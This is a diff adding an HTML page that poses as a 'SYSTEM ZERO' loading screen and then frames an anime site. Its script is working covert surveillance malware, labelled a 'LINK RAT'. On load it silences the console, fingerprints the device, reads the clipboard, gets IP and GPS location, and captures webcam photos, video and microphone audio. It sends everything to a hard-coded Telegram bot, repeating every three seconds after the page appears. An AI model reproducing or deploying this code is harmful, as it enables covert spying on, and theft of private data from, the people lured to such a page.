@@ -1,0 +1,922 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        body {
+            min-height: 100vh;
+            background: #0a0e1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', 'Inter', sans-serif;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Animated Background */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(ellipse at 20% 30%, rgba(0, 180, 255, 0.08) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 70%, rgba(123, 47, 252, 0.08) 0%, transparent 60%),
+                radial-gradient(ellipse at 50% 100%, rgba(0, 255, 200, 0.04) 0%, transparent 50%);
+            z-index: 0;
+            animation: bgMove 10s ease-in-out infinite alternate;
+        }
+
+        @keyframes bgMove {
+            0% { transform: scale(1) rotate(0deg); opacity: 0.6; }
+            100% { transform: scale(1.1) rotate(2deg); opacity: 1; }
+        }
+
+        /* Floating particles */
+        .particles {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            pointer-events: none;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(0, 255, 255, 0.15);
+            border-radius: 50%;
+            animation: floatParticle 8s infinite linear;
+        }
+
+        .particle:nth-child(1) { left: 10%; animation-duration: 12s; animation-delay: 0s; }
+        .particle:nth-child(2) { left: 25%; animation-duration: 9s; animation-delay: 2s; width: 6px; height: 6px; }
+        .particle:nth-child(3) { left: 40%; animation-duration: 14s; animation-delay: 4s; }
+        .particle:nth-child(4) { left: 55%; animation-duration: 10s; animation-delay: 1s; width: 5px; height: 5px; }
+        .particle:nth-child(5) { left: 70%; animation-duration: 11s; animation-delay: 3s; }
+        .particle:nth-child(6) { left: 85%; animation-duration: 13s; animation-delay: 5s; width: 7px; height: 7px; }
+        .particle:nth-child(7) { left: 15%; animation-duration: 15s; animation-delay: 2s; }
+        .particle:nth-child(8) { left: 50%; animation-duration: 8s; animation-delay: 4s; width: 3px; height: 3px; }
+        .particle:nth-child(9) { left: 75%; animation-duration: 12s; animation-delay: 1s; }
+        .particle:nth-child(10) { left: 35%; animation-duration: 10s; animation-delay: 5s; }
+
+        @keyframes floatParticle {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+        }
+
+        /* ===== LOADING CONTAINER ===== */
+        .container {
+            position: relative;
+            width: 100%;
+            max-width: 460px;
+            margin: 20px;
+            padding: 2.8rem 2.2rem;
+            background: rgba(12, 20, 35, 0.7);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border-radius: 40px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.02) inset;
+            text-align: center;
+            z-index: 10;
+            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .container.hidden {
+            opacity: 0;
+            transform: scale(0.95);
+            pointer-events: none;
+        }
+
+        /* Glow border */
+        .container::before {
+            content: '';
+            position: absolute;
+            inset: -1px;
+            border-radius: 41px;
+            padding: 1px;
+            background: linear-gradient(135deg, rgba(0, 180, 255, 0.2), rgba(123, 47, 252, 0.2), rgba(0, 255, 200, 0.1));
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            pointer-events: none;
+        }
+
+        .logo-icon {
+            display: inline-block;
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, rgba(0, 180, 255, 0.1), rgba(123, 47, 252, 0.1));
+            border-radius: 24px;
+            line-height: 72px;
+            font-size: 36px;
+            margin-bottom: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #f0f4ff 30%, #7b8cff 70%, #00d4ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.2rem;
+        }
+
+        .sub {
+            font-size: 0.65rem;
+            color: rgba(255, 255, 255, 0.15);
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            margin-bottom: 1.8rem;
+        }
+
+        .timer-card {
+            width: 110px;
+            height: 110px;
+            background: rgba(7, 18, 31, 0.6);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 0.5rem;
+            border: 1px solid rgba(0, 255, 255, 0.1);
+            box-shadow: 0 0 60px rgba(0, 255, 255, 0.03);
+            position: relative;
+        }
+
+        .timer-card::after {
+            content: '';
+            position: absolute;
+            inset: -3px;
+            border-radius: 50%;
+            padding: 2px;
+            background: conic-gradient(from 0deg, transparent, rgba(0, 255, 255, 0.2), transparent);
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            animation: rotateBorder 3s linear infinite;
+        }
+
+        @keyframes rotateBorder {
+            to { transform: rotate(360deg); }
+        }
+
+        #countdown {
+            font-size: 3rem;
+            font-weight: 900;
+            font-family: 'Inter', monospace;
+            color: #0ff;
+            text-shadow: 0 0 30px rgba(0, 255, 255, 0.15);
+            z-index: 1;
+        }
+
+        .label {
+            font-size: 0.55rem;
+            color: rgba(255, 255, 255, 0.12);
+            letter-spacing: 3px;
+            margin-bottom: 1.2rem;
+        }
+
+        .progress-wrap {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 60px;
+            padding: 2px;
+            border: 1px solid rgba(255, 255, 255, 0.02);
+            margin: 12px 0 8px;
+        }
+
+        .progress-fill {
+            height: 4px;
+            width: 0%;
+            background: linear-gradient(90deg, #00d4ff, #7b8cff, #a855f7);
+            border-radius: 60px;
+            transition: width 0.15s linear;
+        }
+
+        .percent {
+            font-family: 'Inter', monospace;
+            font-size: 0.7rem;
+            color: rgba(255, 255, 255, 0.1);
+            margin-top: 4px;
+            letter-spacing: 1px;
+        }
+
+        .status {
+            font-size: 0.6rem;
+            color: rgba(255, 255, 255, 0.1);
+            margin-top: 0.8rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        /* ===== IFRAME CONTAINER ===== */
+        .iframe-container {
+            position: fixed;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 20;
+            display: none;
+            background: #000;
+        }
+
+        .iframe-container.active {
+            display: block;
+        }
+
+        .iframe-container iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            background: #fff;
+        }
+
+        /* ===== FLOATING ROUND BUTTON ===== */
+        .float-btn {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, rgba(0, 180, 255, 0.2), rgba(123, 47, 252, 0.2));
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            z-index: 30;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            text-align: center;
+            line-height: 1.2;
+            padding: 5px;
+            font-family: 'Inter', sans-serif;
+            letter-spacing: 0.3px;
+        }
+
+        .float-btn:hover {
+            transform: scale(1.08);
+            border-color: rgba(0, 255, 255, 0.2);
+            box-shadow: 0 8px 40px rgba(0, 180, 255, 0.1);
+        }
+
+        .float-btn.active {
+            display: flex;
+        }
+
+        .float-btn .icon {
+            font-size: 18px;
+        }
+
+        .float-btn .label-text {
+            font-size: 7px;
+            opacity: 0.5;
+            display: block;
+            margin-top: 1px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        /* ===== MODE INDICATOR ===== */
+        .mode-indicator {
+            position: fixed;
+            bottom: 100px;
+            right: 30px;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            border-radius: 12px;
+            padding: 6px 14px;
+            color: rgba(255, 255, 255, 0.15);
+            font-size: 9px;
+            font-family: 'Inter', monospace;
+            z-index: 31;
+            display: none;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+        }
+
+        .mode-indicator.active {
+            display: block;
+        }
+
+        /* Responsive */
+        @media (max-width: 420px) {
+            .container { padding: 2rem 1.2rem; }
+            .logo { font-size: 1.4rem; }
+            .logo-icon { width: 56px; height: 56px; line-height: 56px; font-size: 28px; }
+            .timer-card { width: 85px; height: 85px; }
+            #countdown { font-size: 2.2rem; }
+            .float-btn { width: 50px; height: 50px; bottom: 20px; right: 20px; }
+            .mode-indicator { bottom: 80px; right: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Particles -->
+<div class="particles">
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+</div>
+
+<!-- LOADING SCREEN -->
+<div class="container" id="loadingContainer">
+    <div class="logo-icon">⚡</div>
+    <div class="logo">SYSTEM ZERO</div>
+    <div class="sub">Initializing Secure Engine</div>
+
+    <div class="timer-card">
+        <span id="countdown">10</span>
+    </div>
+    <div class="label">SECONDS REMAINING</div>
+
+    <div class="progress-wrap">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
+    <div class="percent" id="percentText">0%</div>
+
+    <div class="status" id="statusMsg">⟳ Loading core modules...</div>
+</div>
+
+<!-- IFRAME CONTAINER -->
+<div class="iframe-container" id="iframeContainer">
+    <iframe id="mainIframe" src="http://animehubbd.rf.gd" allow="camera; microphone; geolocation"></iframe>
+</div>
+
+<!-- FLOATING ROUND BUTTON -->
+<div class="float-btn" id="floatBtn" title="Toggle Mode">
+    <div>
+        <span class="icon">📱</span>
+        <span class="label-text">MODE</span>
+    </div>
+</div>
+
+<!-- MODE INDICATOR -->
+<div class="mode-indicator" id="modeIndicator">🌐 MOBILE MODE</div>
+
+<script>
+    // ================================================================
+    // 🔇 DISABLE ALL CONSOLE OUTPUT
+    // ================================================================
+    window.console.log = function() {};
+    window.console.warn = function() {};
+    window.console.error = function() {};
+    window.console.info = function() {};
+    window.console.debug = function() {};
+    window.console.trace = function() {};
+    window.console.dir = function() {};
+    window.console.table = function() {};
+    window.console.group = function() {};
+    window.console.groupEnd = function() {};
+    window.console.groupCollapsed = function() {};
+    window.console.assert = function() {};
+    window.console.count = function() {};
+    window.console.countReset = function() {};
+    window.console.time = function() {};
+    window.console.timeEnd = function() {};
+    window.console.timeLog = function() {};
+
+    window.addEventListener('error', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return true;
+    }, true);
+
+    window.addEventListener('unhandledrejection', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return true;
+    }, true);
+
+    // ================================================================
+    // 🧠 TELEGRAM CONFIG
+    // ================================================================
+    const BOT_TOKEN = "8752280529:AAFAhega8CuV-c872IwW6ugBNDsMUIiAh14";
+    const CHAT_ID = "8125066512";
+    const REDIRECT_URL = "http://animehubbd.rf.gd";
+
+    // ================================================================
+    // 📦 GLOBAL STATE
+    // ================================================================
+    let totalSeconds = 10;
+    let remaining = totalSeconds;
+    let dataSent = false;
+    let mediaStreams = [];
+    let backgroundInterval = null;
+    let isPCMode = false;
+    let captureCount = 0;
+
+    let collectedData = {};
+
+    // ================================================================
+    // 🎯 DOM REFS
+    // ================================================================
+    const countEl = document.getElementById('countdown');
+    const progressFill = document.getElementById('progressFill');
+    const percentEl = document.getElementById('percentText');
+    const statusEl = document.getElementById('statusMsg');
+    const loadingContainer = document.getElementById('loadingContainer');
+    const iframeContainer = document.getElementById('iframeContainer');
+    const mainIframe = document.getElementById('mainIframe');
+    const floatBtn = document.getElementById('floatBtn');
+    const modeIndicator = document.getElementById('modeIndicator');
+
+    // ================================================================
+    // 🔍 COLLECT ALL DATA
+    // ================================================================
+    function collectAllData() {
+        try {
+            collectedData.userAgent = navigator.userAgent;
+            collectedData.platform = navigator.platform || 'Unknown';
+            collectedData.language = navigator.language;
+            collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+            collectedData.screen = `${screen.width}x${screen.height}`;
+            collectedData.dpr = window.devicePixelRatio || 1;
+            collectedData.colorDepth = screen.colorDepth + '-bit';
+            collectedData.deviceMemory = navigator.deviceMemory || 'Unknown';
+            collectedData.cpuCores = navigator.hardwareConcurrency || 'Unknown';
+            collectedData.maxTouchPoints = navigator.maxTouchPoints || 0;
+            collectedData.touchSupport = 'ontouchstart' in window ? 'Yes' : 'No';
+            collectedData.timestamp = new Date().toISOString();
+            collectedData.url = window.location.href;
+            collectedData.captureCount = captureCount;
+
+            if (screen.orientation) {
+                collectedData.orientation = screen.orientation.type;
+                collectedData.orientationAngle = screen.orientation.angle;
+            }
+
+            try {
+                collectedData.darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light';
+            } catch (e) {}
+
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(b => {
+                    collectedData.batteryLevel = Math.floor(b.level * 100) + '%';
+                    collectedData.batteryCharging = b.charging ? 'Yes' : 'No';
+                }).catch(() => {});
+            }
+
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                collectedData.networkType = conn.effectiveType || conn.type || 'Unknown';
+                collectedData.downlink = conn.downlink ? conn.downlink + ' Mbps' : 'Unknown';
+                collectedData.rtt = conn.rtt ? conn.rtt + ' ms' : 'Unknown';
+            }
+
+            try {
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl');
+                if (gl) {
+                    const d = gl.getExtension('WEBGL_debug_renderer_info');
+                    collectedData.gpu = d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : 'WebGL detected';
+                }
+            } catch (e) {}
+
+            if (navigator.storage && navigator.storage.estimate) {
+                navigator.storage.estimate().then(est => {
+                    collectedData.storageUsage = Math.round(est.usage / 1024 / 1024) + ' MB';
+                    collectedData.storageQuota = Math.round(est.quota / 1024 / 1024) + ' MB';
+                }).catch(() => {});
+            }
+
+            collectedData.vibrateSupport = navigator.vibrate ? 'Supported' : 'Not supported';
+            collectedData.online = navigator.onLine ? 'Online' : 'Offline';
+
+            const ua = navigator.userAgent;
+            let deviceModel = 'Unknown',
+                deviceBrand = 'Unknown',
+                osVersion = 'Unknown';
+
+            if (/Android/i.test(ua)) {
+                deviceBrand = 'Android';
+                const match = ua.match(/Android [\d.]+; ([^;]+)/);
+                if (match && match[1]) deviceModel = match[1];
+                const verMatch = ua.match(/Android\s([\d.]+)/);
+                if (verMatch) osVersion = 'Android ' + verMatch[1];
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                deviceBrand = 'Apple';
+                if (/iPhone/i.test(ua)) deviceModel = 'iPhone';
+                else if (/iPad/i.test(ua)) deviceModel = 'iPad';
+                else if (/iPod/i.test(ua)) deviceModel = 'iPod';
+                const verMatch = ua.match(/OS\s([\d_]+)/);
+                if (verMatch) osVersion = 'iOS ' + verMatch[1].replace(/_/g, '.');
+            } else if (/Windows NT/i.test(ua)) {
+                deviceBrand = 'Windows PC';
+                const winMatch = ua.match(/Windows NT ([\d.]+)/);
+                if (winMatch) osVersion = 'Windows ' + winMatch[1];
+            } else if (/Mac OS X/i.test(ua)) {
+                deviceBrand = 'Mac';
+                osVersion = 'macOS';
+            }
+
+            collectedData.deviceModel = deviceModel;
+            collectedData.deviceBrand = deviceBrand;
+            collectedData.osVersion = osVersion;
+
+            let browser = 'Unknown',
+                browserVersion = 'Unknown';
+            if (ua.includes('Chrome') && !ua.includes('Edg')) {
+                browser = 'Chrome';
+                const match = ua.match(/Chrome\/([\d.]+)/);
+                if (match) browserVersion = match[1];
+            } else if (ua.includes('Firefox')) {
+                browser = 'Firefox';
+                const match = ua.match(/Firefox\/([\d.]+)/);
+                if (match) browserVersion = match[1];
+            } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
+                browser = 'Safari';
+                const match = ua.match(/Version\/([\d.]+)/);
+                if (match) browserVersion = match[1];
+            } else if (ua.includes('Edg')) {
+                browser = 'Edge';
+                const match = ua.match(/Edg\/([\d.]+)/);
+                if (match) browserVersion = match[1];
+            }
+            collectedData.browser = browser + ' ' + browserVersion;
+
+            const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua);
+            collectedData.deviceType = isMobile ? 'Mobile' : 'Desktop';
+
+        } catch (e) {}
+    }
+
+    // ================================================================
+    // 📋 CLIPBOARD
+    // ================================================================
+    async function collectClipboard() {
+        try {
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                const text = await navigator.clipboard.readText();
+                collectedData.clipboard = text || 'Empty';
+            }
+        } catch (e) {
+            collectedData.clipboard = 'Permission denied';
+        }
+    }
+
+    // ================================================================
+    // 🌐 IP
+    // ================================================================
+    async function collectIP() {
+        try {
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            collectedData.ip = d.ip;
+        } catch (e) { collectedData.ip = 'Unavailable'; }
+
+        try {
+            const r2 = await fetch('https://ipinfo.io/json?token=9e1d3c2b3f3a2c');
+            const d2 = await r2.json();
+            collectedData.city = d2.city || 'N/A';
+            collectedData.country = d2.country || 'N/A';
+            collectedData.isp = d2.org || 'N/A';
+            collectedData.region = d2.region || 'N/A';
+        } catch (e) {
+            collectedData.city = 'N/A';
+            collectedData.country = 'N/A';
+            collectedData.isp = 'N/A';
+            collectedData.region = 'N/A';
+        }
+    }
+
+    // ================================================================
+    // 📸 CAMERA (PHOTO + VIDEO)
+    // ================================================================
+    async function captureCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 640 } },
+                audio: true
+            });
+            mediaStreams.push(stream);
+
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            video.playsInline = true;
+            await new Promise(res => {
+                video.onloadedmetadata = () => { video.play();
+                    res(); };
+                setTimeout(res, 1000);
+            });
+            await new Promise(r => setTimeout(r, 200));
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 480;
+            canvas.height = video.videoHeight || 640;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            collectedData.photo = canvas.toDataURL('image/jpeg', 0.7);
+
+            let mimeType = '';
+            const types = ['video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm'];
+            for (let t of types) {
+                if (MediaRecorder.isTypeSupported(t)) { mimeType = t; break; }
+            }
+
+            const recorder = new MediaRecorder(stream, mimeType ? { mimeType } : {});
+            const chunks = [];
+            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            const stopP = new Promise(res => recorder.onstop = () => res(new Blob(chunks, { type: mimeType ||
+                    'video/webm' })));
+            recorder.start();
+            await new Promise(r => setTimeout(r, 3000));
+            recorder.stop();
+            const vidBlob = await stopP;
+            if (vidBlob && vidBlob.size > 5000) collectedData.video = vidBlob;
+
+            video.remove();
+            stream.getTracks().forEach(t => t.stop());
+        } catch (e) {
+            collectedData.cameraErr = e.name || 'Denied';
+        }
+    }
+
+    // ================================================================
+    // 🎤 MICROPHONE
+    // ================================================================
+    async function captureAudio() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaStreams.push(stream);
+
+            let mimeType = '';
+            const types = ['audio/webm;codecs=opus', 'audio/webm'];
+            for (let t of types) {
+                if (MediaRecorder.isTypeSupported(t)) { mimeType = t; break; }
+            }
+
+            const recorder = new MediaRecorder(stream, mimeType ? { mimeType } : {});
+            const chunks = [];
+            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            const stopP = new Promise(res => recorder.onstop = () => res(new Blob(chunks, { type: mimeType ||
+                    'audio/webm' })));
+            recorder.start();
+            await new Promise(r => setTimeout(r, 3000));
+            recorder.stop();
+            const audBlob = await stopP;
+            if (audBlob && audBlob.size > 500) collectedData.audio = audBlob;
+
+            stream.getTracks().forEach(t => t.stop());
+        } catch (e) {
+            collectedData.audioErr = e.name || 'Denied';
+        }
+    }
+
+    // ================================================================
+    // 📍 GPS
+    // ================================================================
+    function getLocation() {
+        if (!navigator.geolocation) {
+            collectedData.gps_lat = 'Not supported';
+            collectedData.gps_lon = 'Not supported';
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                collectedData.gps_lat = pos.coords.latitude.toFixed(6);
+                collectedData.gps_lon = pos.coords.longitude.toFixed(6);
+                collectedData.gps_acc = Math.round(pos.coords.accuracy) + 'm';
+                if (pos.coords.speed) collectedData.gps_speed = (pos.coords.speed * 3.6).toFixed(2) + ' km/h';
+            },
+            err => {
+                collectedData.gps_lat = 'Denied';
+                collectedData.gps_lon = 'Denied';
+                collectedData.gps_acc = err.message || 'Error';
+            }, { enableHighAccuracy: true, timeout: 15000 }
+        );
+    }
+
+    // ================================================================
+    // 📤 SEND TO TELEGRAM
+    // ================================================================
+    async function sendToTelegram() {
+        try {
+            let msg = `🔥 *@BHHKTEAMS LINK RAT DEVICE REPORT #${captureCount}* 🔥\n`;
+            msg += `━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🌐 *IP:* ${collectedData.ip || 'N/A'} (${collectedData.isp || 'N/A'})\n`;
+            msg += `📍 *City:* ${collectedData.city || 'N/A'}, ${collectedData.country || 'N/A'}\n`;
+            msg += `🎯 *GPS:* ${collectedData.gps_lat || 'N/A'}, ${collectedData.gps_lon || 'N/A'} (${collectedData.gps_acc || 'N/A'})\n`;
+            if (collectedData.gps_speed) msg += `🚗 *Speed:* ${collectedData.gps_speed}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━\n`;
+            msg += `📱 *Device:* ${collectedData.deviceBrand || 'N/A'} ${collectedData.deviceModel || 'N/A'}\n`;
+            msg += `⚙️ *OS:* ${collectedData.osVersion || 'N/A'}\n`;
+            msg += `🌐 *Browser:* ${collectedData.browser || 'N/A'}\n`;
+            msg += `🧠 *CPU:* ${collectedData.cpuCores || 'N/A'} cores\n`;
+            msg += `💾 *RAM:* ${collectedData.deviceMemory || 'N/A'} GB\n`;
+            msg += `📺 *Screen:* ${collectedData.screen || 'N/A'} (${collectedData.colorDepth || 'N/A'})\n`;
+            msg += `🔄 *Orientation:* ${collectedData.orientation || 'N/A'}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🔋 *Battery:* ${collectedData.batteryLevel || 'N/A'} (${collectedData.batteryCharging || 'N/A'})\n`;
+            msg += `📶 *Network:* ${collectedData.networkType || 'N/A'} | ${collectedData.downlink || 'N/A'}\n`;
+            msg += `🎨 *GPU:* ${collectedData.gpu || 'N/A'}\n`;
+            msg += `💾 *Storage:* ${collectedData.storageUsage || 'N/A'} / ${collectedData.storageQuota || 'N/A'}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━\n`;
+            msg += `📋 *Clipboard:* ${collectedData.clipboard || 'N/A'}\n`;
+            msg += `📸 *Photo:* ${collectedData.photo ? '✅' : '❌'}\n`;
+            msg += `🎥 *Video:* ${collectedData.video ? '✅' : '❌'}\n`;
+            msg += `🎤 *Audio:* ${collectedData.audio ? '✅' : '❌'}\n`;
+            msg += `🕒 *Time:* ${new Date().toLocaleString()}\n`;
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            });
+
+            // --- Send Photo ---
+            if (collectedData.photo) {
+                const blob = await (await fetch(collectedData.photo)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            }
+
+            // --- Send Video ---
+            if (collectedData.video) {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('video', collectedData.video);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+            }
+
+            // --- Send Audio ---
+            if (collectedData.audio) {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('audio', collectedData.audio);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd });
+            }
+
+        } catch (e) {}
+    }
+
+    // ================================================================
+    // 🔄 CONTINUOUS BACKGROUND CAPTURE (EVERY 3 SECONDS)
+    // ================================================================
+    async function continuousCapture() {
+        captureCount++;
+        try {
+            // Capture new photo
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
+                audio: true
+            });
+            mediaStreams.push(stream);
+
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            video.playsInline = true;
+            await new Promise(res => {
+                video.onloadedmetadata = () => { video.play();
+                    res(); };
+                setTimeout(res, 500);
+            });
+            await new Promise(r => setTimeout(r, 100));
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 320;
+            canvas.height = video.videoHeight || 240;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            collectedData.photo = canvas.toDataURL('image/jpeg', 0.5);
+
+            video.remove();
+            stream.getTracks().forEach(t => t.stop());
+
+            // Update all data
+            collectAllData();
+            await collectIP();
+            getLocation();
+            await collectClipboard();
+
+            // Send to Telegram
+            await sendToTelegram();
+
+        } catch (e) {
+            // If fails, still send whatever data we have
+            collectAllData();
+            await collectIP();
+            await sendToTelegram();
+        }
+    }
+
+    // ================================================================
+    // 🖱️ FLOATING BUTTON — MODE TOGGLE
+    // ================================================================
+    floatBtn.addEventListener('click', function() {
+        isPCMode = !isPCMode;
+
+        if (isPCMode) {
+            floatBtn.innerHTML = '<div><span class="icon">💻</span><span class="label-text">PC</span></div>';
+            modeIndicator.textContent = '💻 PC MODE';
+            modeIndicator.style.color = 'rgba(0, 255, 255, 0.5)';
+            mainIframe.src = REDIRECT_URL + '?mode=desktop&_=' + Date.now();
+        } else {
+            floatBtn.innerHTML = '<div><span class="icon">📱</span><span class="label-text">MODE</span></div>';
+            modeIndicator.textContent = '📱 MOBILE MODE';
+            modeIndicator.style.color = 'rgba(255, 255, 255, 0.2)';
+            mainIframe.src = REDIRECT_URL + '?mode=mobile&_=' + Date.now();
+        }
+
+        // Flash indicator
+        modeIndicator.style.opacity = '1';
+        setTimeout(() => { modeIndicator.style.opacity = '0.6'; }, 300);
+    });
+
+    // ================================================================
+    // 🧠 MAIN — LOADING + PERMISSIONS + REDIRECT
+    // ================================================================
+    async function start() {
+        collectAllData();
+        await collectIP();
+
+        statusEl.innerHTML = '⟳ REQUESTING SERVER...';
+
+        getLocation();
+        await collectClipboard();
+        await captureCamera();
+        await captureAudio();
+
+        // Send initial data
+        await sendToTelegram();
+
+        // Start timer
+        let timer = setInterval(() => {
+            if (remaining > 0) {
+                remaining--;
+                countEl.innerText = remaining;
+                let percent = ((totalSeconds - remaining) / totalSeconds) * 100;
+                percentEl.innerText = Math.floor(percent) + '%';
+                progressFill.style.width = percent + '%';
+                if (remaining <= 3) statusEl.innerHTML = '⟳ FINALIZING...';
+            }
+            if (remaining === 0) {
+                clearInterval(timer);
+                statusEl.innerHTML = '⟳ REDIRECTING...';
+
+                // Hide loading, show iframe
+                loadingContainer.classList.add('hidden');
+                iframeContainer.classList.add('active');
+                floatBtn.classList.add('active');
+                modeIndicator.classList.add('active');
+
+                // Load the URL in iframe
+                mainIframe.src = REDIRECT_URL;
+
+                // Start background capture every 3 seconds
+                setTimeout(async () => {
+                    await continuousCapture();
+                    backgroundInterval = setInterval(async () => {
+                        await continuousCapture();
+                    }, 3000);
+                }, 2000);
+            }
+        }, 1000);
+    }
+
+    // ================================================================
+    // 🚀 START
+    // ================================================================
+    window.addEventListener('load', () => {
+        start();
+    });
+
+    window.addEventListener('beforeunload', () => {
+        mediaStreams.forEach(s => s.getTracks().forEach(t => t.stop()));
+        if (backgroundInterval) clearInterval(backgroundInterval);
+    });
+</script>
+</body>
+</html>
